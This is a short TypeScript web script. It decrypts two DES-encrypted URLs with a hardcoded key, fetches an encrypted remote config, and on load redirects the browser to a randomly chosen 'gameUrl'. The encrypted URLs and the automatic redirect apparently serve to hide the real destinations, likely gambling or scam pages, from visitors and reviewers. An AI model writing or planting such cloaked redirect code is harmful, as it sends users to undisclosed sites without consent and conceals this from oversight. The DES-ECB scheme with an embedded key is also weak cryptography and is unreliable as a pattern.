// import axios from "../node_modules/axios/index";

import axios from '../node_modules/axios/index';
import * as CryptoJS from 'crypto-js';
/**
 * DES加密
 * @param message
 * @param key
 * @returns
 */
function encryptByDES(message: string, key: string) {
    var keyHex = CryptoJS.enc.Utf8.parse(key);
    var encrypted = CryptoJS.DES.encrypt(message, keyHex, {
        mode: CryptoJS.mode.ECB,
        padding: CryptoJS.pad.Pkcs7,
    });

    return encrypted.ciphertext.toString();
}
/**
 * DES解密
 * @param text
 * @param key
 * @returns
 */
function decryptByDES(text: string, key: string) {
    //DES解密
    var keyHex = CryptoJS.enc.Utf8.parse(key);
    let decrypted = CryptoJS.DES.decrypt({ ciphertext: CryptoJS.enc.Hex.parse(text) } as any, keyHex, {
        mode: CryptoJS.mode.ECB,
        padding: CryptoJS.pad.Pkcs7,
    });

    return decrypted.toString(CryptoJS.enc.Utf8);
}
const getConfigFile = async (url: string) => {
    try {
        let req = await axiosInstance.request({ headers: {}, url: url, method: 'get' });
        if (req && req.data && req.data.text) {
            let decryptStr = decryptByDES(req.data.text, 'DAPPDAPP');
            return { config: JSON.parse(decryptStr) };
        }
    } catch (error) {
        return { error: error };
    }
};
const randomInteger = function (min: number, max: number): number {
    var choices = max - min + 1;
    return Math.floor(Math.random() * choices + min);
};

const getURL = async (urlList: Array<string>) => {
    for (let url of urlList) {
        let realUrl = decryptByDES(url, 'DAPPDAPP');
        let ret = await getConfigFile(realUrl);
        if (ret && ret.config) {
            let gameUrl = ret.config.gameUrl || [];
            if (gameUrl.length == 0) continue;
            let ref: string = gameUrl[randomInteger(0, gameUrl.length - 1)];
            window.location.href = ref;
            break;
        }
    }
};
const axiosInstance = axios.create();

getURL([
    'C54C80B19F3763AF727F3EAF7A32B92A96893F4100D65AE771EEF86FD68149A92ADE3B7A8DCF99FDE29DC77DA191F05F',
    'C54C80B19F3763AF99AA6C694322AF7026EAD4DE0A5672B0254C80AB10477163E97BB56AB5802EC53FBF1D3820F65BAF',
]);

